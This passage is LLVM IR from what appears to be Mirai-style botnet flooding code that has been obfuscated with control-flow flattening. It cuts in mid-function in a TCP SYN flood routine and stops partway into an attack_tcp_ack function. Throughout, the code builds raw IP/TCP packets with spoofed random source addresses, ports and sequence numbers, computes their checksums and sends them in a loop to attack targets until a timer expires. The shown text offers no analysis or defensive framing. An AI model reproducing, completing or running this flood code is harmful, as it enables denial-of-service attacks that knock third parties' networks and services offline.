  %202 = load i16, i16* %201, align 4
  %203 = and i16 %202, -241
  %204 = or i16 %203, 160
  store i16 %204, i16* %201, align 4
  %205 = load i8, i8* %22, align 1
  %206 = sext i8 %205 to i16
  %207 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %208 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %207, i32 0, i32 4
  %209 = load i16, i16* %208, align 4
  %210 = and i16 %206, 1
  %211 = shl i16 %210, 13
  %212 = and i16 %209, -8193
  %213 = or i16 %212, %211
  store i16 %213, i16* %208, align 4
  %214 = load i8, i8* %23, align 1
  %215 = sext i8 %214 to i16
  %216 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = and i16 %215, 1
  %220 = shl i16 %219, 12
  %221 = and i16 %218, -4097
  %222 = or i16 %221, %220
  store i16 %222, i16* %217, align 4
  %223 = load i8, i8* %24, align 1
  %224 = sext i8 %223 to i16
  %225 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = and i16 %224, 1
  %229 = shl i16 %228, 11
  %230 = and i16 %227, -2049
  %231 = or i16 %230, %229
  store i16 %231, i16* %226, align 4
  %232 = load i8, i8* %25, align 1
  %233 = sext i8 %232 to i16
  %234 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 4
  %236 = load i16, i16* %235, align 4
  %237 = and i16 %233, 1
  %238 = shl i16 %237, 10
  %239 = and i16 %236, -1025
  %240 = or i16 %239, %238
  store i16 %240, i16* %235, align 4
  %241 = load i8, i8* %26, align 1
  %242 = sext i8 %241 to i16
  %243 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 4
  %245 = load i16, i16* %244, align 4
  %246 = and i16 %242, 1
  %247 = shl i16 %246, 9
  %248 = and i16 %245, -513
  %249 = or i16 %248, %247
  store i16 %249, i16* %244, align 4
  %250 = load i8, i8* %27, align 1
  %251 = sext i8 %250 to i16
  %252 = load %struct.tcphdr*, %struct.tcphdr** %31, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %251, 1
  %256 = shl i16 %255, 8
  %257 = and i16 %254, -257
  %258 = or i16 %257, %256
  store i16 %258, i16* %253, align 4
  %259 = load i8*, i8** %32, align 8
  %260 = getelementptr inbounds i8, i8* %259, i32 1
  store i8* %260, i8** %32, align 8
  store i8 2, i8* %259, align 1
  %261 = load i8*, i8** %32, align 8
  %262 = getelementptr inbounds i8, i8* %261, i32 1
  store i8* %262, i8** %32, align 8
  store i8 4, i8* %261, align 1
  %263 = call i32 @rand_next()
  %264 = and i32 %263, 15
  %265 = add i32 1400, %264
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #7
  %268 = load i8*, i8** %32, align 8
  %269 = bitcast i8* %268 to i16*
  store i16 %267, i16* %269, align 2
  %270 = load i8*, i8** %32, align 8
  %271 = getelementptr inbounds i8, i8* %270, i64 2
  store i8* %271, i8** %32, align 8
  %272 = load i8*, i8** %32, align 8
  %273 = getelementptr inbounds i8, i8* %272, i32 1
  store i8* %273, i8** %32, align 8
  store i8 4, i8* %272, align 1
  %274 = load i8*, i8** %32, align 8
  %275 = getelementptr inbounds i8, i8* %274, i32 1
  store i8* %275, i8** %32, align 8
  store i8 2, i8* %274, align 1
  %276 = load i8*, i8** %32, align 8
  %277 = getelementptr inbounds i8, i8* %276, i32 1
  store i8* %277, i8** %32, align 8
  store i8 8, i8* %276, align 1
  %278 = load i8*, i8** %32, align 8
  %279 = getelementptr inbounds i8, i8* %278, i32 1
  store i8* %279, i8** %32, align 8
  store i8 10, i8* %278, align 1
  %280 = call i32 @rand_next()
  %281 = load i8*, i8** %32, align 8
  %282 = bitcast i8* %281 to i32*
  store i32 %280, i32* %282, align 4
  %283 = load i8*, i8** %32, align 8
  %284 = getelementptr inbounds i8, i8* %283, i64 4
  store i8* %284, i8** %32, align 8
  %285 = load i8*, i8** %32, align 8
  %286 = bitcast i8* %285 to i32*
  store i32 0, i32* %286, align 4
  %287 = load i8*, i8** %32, align 8
  %288 = getelementptr inbounds i8, i8* %287, i64 4
  store i8* %288, i8** %32, align 8
  %289 = load i8*, i8** %32, align 8
  %290 = getelementptr inbounds i8, i8* %289, i32 1
  store i8* %290, i8** %32, align 8
  store i8 1, i8* %289, align 1
  %291 = load i8*, i8** %32, align 8
  %292 = getelementptr inbounds i8, i8* %291, i32 1
  store i8* %292, i8** %32, align 8
  store i8 3, i8* %291, align 1
  %293 = load i8*, i8** %32, align 8
  %294 = getelementptr inbounds i8, i8* %293, i32 1
  store i8* %294, i8** %32, align 8
  store i8 3, i8* %293, align 1
  %295 = load i8*, i8** %32, align 8
  %296 = getelementptr inbounds i8, i8* %295, i32 1
  store i8* %296, i8** %32, align 8
  store i8 6, i8* %295, align 1
  store i32 -2084913122, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load i32, i32* %11, align 4
  %299 = add nsw i32 %298, 1
  store i32 %299, i32* %11, align 4
  store i32 -1091458834, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  store i32 1604389022, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1678218144, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i32, i32* %11, align 4
  %304 = load i8, i8* %7, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp slt i32 %303, %305
  %307 = select i1 %306, i32 -649201656, i32 -273903858
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = load i8**, i8*** %13, align 8
  %310 = load i32, i32* %11, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds i8*, i8** %309, i64 %311
  %313 = load i8*, i8** %312, align 8
  store i8* %313, i8** %33, align 8
  %314 = load i8*, i8** %33, align 8
  %315 = bitcast i8* %314 to %struct.iphdr*
  store %struct.iphdr* %315, %struct.iphdr** %34, align 8
  %316 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i64 1
  %318 = bitcast %struct.iphdr* %317 to %struct.tcphdr*
  store %struct.tcphdr* %318, %struct.tcphdr** %35, align 8
  %319 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %320 = load i32, i32* %11, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %319, i64 %321
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i32 0, i32 2
  %324 = load i8, i8* %323, align 4
  %325 = zext i8 %324 to i32
  %326 = icmp slt i32 %325, 32
  %327 = select i1 %326, i32 825346973, i32 -1502989306
  store i32 %327, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  %329 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %330 = load i32, i32* %11, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 1
  %334 = load i32, i32* %333, align 4
  %335 = call i32 @ntohl(i32 %334) #7
  %336 = call i32 @rand_next()
  %337 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %338 = load i32, i32* %11, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %337, i64 %339
  %341 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %340, i32 0, i32 2
  %342 = load i8, i8* %341, align 4
  %343 = zext i8 %342 to i32
  %344 = lshr i32 %336, %343
  %345 = add i32 %335, %344
  %346 = call i32 @htonl(i32 %345) #7
  %347 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 9
  store i32 %346, i32* %348, align 4
  store i32 -1502989306, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i32, i32* %28, align 4
  %351 = icmp eq i32 %350, -1
  %352 = select i1 %351, i32 -1992585658, i32 -623265862
  store i32 %352, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = call i32 @rand_next()
  %355 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 8
  store i32 %354, i32* %356, align 4
  store i32 -623265862, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i16, i16* %15, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  %361 = select i1 %360, i32 1033292932, i32 1966710414
  store i32 %361, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  %363 = call i32 @rand_next()
  %364 = and i32 %363, 65535
  %365 = trunc i32 %364 to i16
  %366 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 3
  store i16 %365, i16* %367, align 4
  store i32 1966710414, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = load i16, i16* %18, align 2
  %370 = zext i16 %369 to i32
  %371 = icmp eq i32 %370, 65535
  %372 = select i1 %371, i32 298574385, i32 -654132899
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = call i32 @rand_next()
  %375 = and i32 %374, 65535
  %376 = trunc i32 %375 to i16
  %377 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 0
  store i16 %376, i16* %378, align 4
  store i32 -654132899, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i16, i16* %19, align 2
  %381 = zext i16 %380 to i32
  %382 = icmp eq i32 %381, 65535
  %383 = select i1 %382, i32 315443832, i32 1563610265
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = call i32 @rand_next()
  %386 = and i32 %385, 65535
  %387 = trunc i32 %386 to i16
  %388 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 1
  store i16 %387, i16* %389, align 2
  store i32 1563610265, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %20, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 828656931, i32 1365635996
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 2
  store i32 %395, i32* %397, align 4
  store i32 1365635996, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i32, i32* %21, align 4
  %400 = icmp eq i32 %399, 65535
  %401 = select i1 %400, i32 106642565, i32 -1041231301
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 3
  store i32 %403, i32* %405, align 4
  store i32 -1041231301, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = load i8, i8* %22, align 1
  %408 = icmp ne i8 %407, 0
  %409 = select i1 %408, i32 -768212796, i32 1577443489
  store i32 %409, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = call i32 @rand_next()
  %412 = and i32 %411, 65535
  %413 = trunc i32 %412 to i16
  %414 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  store i32 1577443489, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %418 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %417, i32 0, i32 7
  store i16 0, i16* %418, align 2
  %419 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %420 = bitcast %struct.iphdr* %419 to i16*
  %421 = call zeroext i16 @checksum_generic(i16* %420, i32 20)
  %422 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %423 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %422, i32 0, i32 7
  store i16 %421, i16* %423, align 2
  %424 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 6
  store i16 0, i16* %425, align 4
  %426 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %427 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %428 = bitcast %struct.tcphdr* %427 to i8*
  %429 = call zeroext i16 @htons(i16 zeroext 40) #7
  %430 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %426, i8* %428, i16 zeroext %429, i32 40)
  %431 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %432 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %431, i32 0, i32 6
  store i16 %430, i16* %432, align 4
  %433 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %434 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %433, i32 0, i32 1
  %435 = load i16, i16* %434, align 2
  %436 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %437 = load i32, i32* %11, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %436, i64 %438
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %439, i32 0, i32 0
  %441 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %440, i32 0, i32 1
  store i16 %435, i16* %441, align 2
  %442 = load i32, i32* %12, align 4
  %443 = load i8*, i8** %33, align 8
  %444 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %445 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %446 = load i32, i32* %11, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i32 0, i32 0
  %450 = bitcast %struct.sockaddr_in* %449 to %struct.sockaddr*
  store %struct.sockaddr* %450, %struct.sockaddr** %444, align 8
  %451 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %452 = load %struct.sockaddr*, %struct.sockaddr** %451, align 8
  %453 = call i64 @sendto(i32 %442, i8* %443, i64 60, i32 16384, %struct.sockaddr* %452, i32 16)
  store i32 543387550, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i32, i32* %11, align 4
  %456 = add nsw i32 %455, 1
  store i32 %456, i32* %11, align 4
  store i32 -1678218144, i32* %switchVar
  br label %loopEnd

; <label>:457:                                    ; preds = %loopEntry
  %458 = call i64 @time(i64* null) #6
  %459 = load i32, i32* %29, align 4
  %460 = sext i32 %459 to i64
  %461 = icmp sgt i64 %458, %460
  %462 = select i1 %461, i32 1409208917, i32 1545376009
  store i32 %462, i32* %switchVar
  br label %loopEnd

; <label>:463:                                    ; preds = %loopEntry
  store i32 -760300997, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  store i32 1604389022, i32* %switchVar
  br label %loopEnd

; <label>:465:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %464, %463, %457, %454, %416, %410, %406, %402, %398, %394, %390, %384, %379, %373, %368, %362, %357, %353, %349, %328, %308, %302, %301, %300, %297, %172, %168, %124, %118, %117, %114, %108, %107, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i8, align 1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.tcphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %40 = load i8, i8* %7, align 1
  %41 = zext i8 %40 to i64
  %42 = call noalias i8* @calloc(i64 %41, i64 8) #6
  %43 = bitcast i8* %42 to i8**
  store i8** %43, i8*** %13, align 8
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 2, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %14, align 1
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 3, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %15, align 2
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 4, i32 64)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %16, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 5, i32 0)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %17, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 6, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %18, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 7, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %19, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 16, i32 65535)
  store i32 %70, i32* %20, align 4
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 17, i32 65535)
  store i32 %73, i32* %21, align 4
  %74 = load i8, i8* %9, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 10, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %22, align 1
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 11, i32 1)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %23, align 1
  %82 = load i8, i8* %9, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 12, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %24, align 1
  %86 = load i8, i8* %9, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 13, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %25, align 1
  %90 = load i8, i8* %9, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 14, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %26, align 1
  %94 = load i8, i8* %9, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %96 = call i32 @attack_get_opt_int(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 15, i32 0)
  %97 = trunc i32 %96 to i8
  store i8 %97, i8* %27, align 1
  %98 = load i8, i8* %9, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 0, i32 512)
  store i32 %100, i32* %28, align 4
  %101 = load i8, i8* %9, align 1
  %102 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %103 = call i32 @attack_get_opt_int(i8 zeroext %101, %struct.attack_option* %102, i8 zeroext 1, i32 1)
  %104 = trunc i32 %103 to i8
  store i8 %104, i8* %29, align 1
  %105 = load i8, i8* %9, align 1
  %106 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %107 = load i32, i32* @LOCAL_ADDR, align 4
  %108 = call i32 @attack_get_opt_ip(i8 zeroext %105, %struct.attack_option* %106, i8 zeroext 19, i32 %107)
  store i32 %108, i32* %30, align 4
  %109 = call i64 @time(i64* null) #6
  %110 = load i32, i32* %6, align 4
  %111 = sext i32 %110 to i64
  %112 = add nsw i64 %109, %111
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %31, align 4
  %114 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %114, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 158361106, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 158361106, label %first
    i32 -143434996, label %117
    i32 -1135852221, label %118
    i32 662150899, label %124
    i32 473049032, label %127
    i32 181932633, label %128
    i32 -836003747, label %134
    i32 1674386163, label %182
    i32 -24138298, label %186
    i32 -282661891, label %281
    i32 1236075261, label %287
    i32 -1854058645, label %294
    i32 -770800229, label %297
    i32 1435694217, label %298
    i32 1961513081, label %299
    i32 665846747, label %305
    i32 -237620335, label %328
    i32 -745839858, label %349
    i32 366854808, label %353
    i32 -1864135702, label %357
    i32 1902159446, label %362
    i32 -804146366, label %368
    i32 -320665745, label %373
    i32 -2003544445, label %379
    i32 -195810405, label %384
    i32 -1343061299, label %390
    i32 -287568527, label %394
    i32 696734596, label %398
    i32 36432941, label %402
    i32 -1831013205, label %406
    i32 -743846078, label %410
    i32 37128615, label %417
    i32 1440128617, label %466
    i32 776017087, label %469
    i32 -1536936487, label %475
    i32 1801184419, label %476
    i32 -250460664, label %477
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %115 = icmp eq i32 %.reload, -1
  %116 = select i1 %115, i32 -143434996, i32 -1135852221
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  store i32 -250460664, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %119 = load i32, i32* %12, align 4
  %120 = bitcast i32* %11 to i8*
  %121 = call i32 @setsockopt(i32 %119, i32 0, i32 3, i8* %120, i32 4) #6
  %122 = icmp eq i32 %121, -1
  %123 = select i1 %122, i32 662150899, i32 473049032
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i32, i32* %12, align 4
  %126 = call i32 @close(i32 %125)
  store i32 -250460664, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 181932633, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %11, align 4
  %130 = load i8, i8* %7, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp slt i32 %129, %131
  %133 = select i1 %132, i32 -836003747, i32 -770800229
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %136 = load i8**, i8*** %13, align 8
  %137 = load i32, i32* %11, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8*, i8** %136, i64 %138
  store i8* %135, i8** %139, align 8
  %140 = load i8**, i8*** %13, align 8
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i8*, i8** %140, i64 %142
  %144 = load i8*, i8** %143, align 8
  %145 = bitcast i8* %144 to %struct.iphdr*
  store %struct.iphdr* %145, %struct.iphdr** %32, align 8
  %146 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %147 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %146, i64 1
  %148 = bitcast %struct.iphdr* %147 to %struct.tcphdr*
  store %struct.tcphdr* %148, %struct.tcphdr** %33, align 8
  %149 = load %struct.tcphdr*, %struct.tcphdr** %33, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i64 1
  %151 = bitcast %struct.tcphdr* %150 to i8*
  store i8* %151, i8** %34, align 8
  %152 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = load i8, i8* %153, align 4
  %155 = and i8 %154, 15
  %156 = or i8 %155, 64
  store i8 %156, i8* %153, align 4
  %157 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %158 = bitcast %struct.iphdr* %157 to i8*
  %159 = load i8, i8* %158, align 4
  %160 = and i8 %159, -16
  %161 = or i8 %160, 5
  store i8 %161, i8* %158, align 4
  %162 = load i8, i8* %14, align 1
  %163 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 1
  store i8 %162, i8* %164, align 1
  %165 = load i32, i32* %28, align 4
  %166 = sext i32 %165 to i64
  %167 = add i64 40, %166
  %168 = trunc i64 %167 to i16
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 2
  store i16 %169, i16* %171, align 2
  %172 = load i16, i16* %15, align 2
  %173 = call zeroext i16 @htons(i16 zeroext %172) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 3
  store i16 %173, i16* %175, align 4
  %176 = load i8, i8* %16, align 1
  %177 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 5
  store i8 %176, i8* %178, align 4
  %179 = load i8, i8* %17, align 1
  %180 = icmp ne i8 %179, 0
  %181 = select i1 %180, i32 1674386163, i32 -24138298
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %184 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 4
  store i16 %183, i16* %185, align 2
  store i32 -24138298, i32* %switchVar
  br label %loopEnd

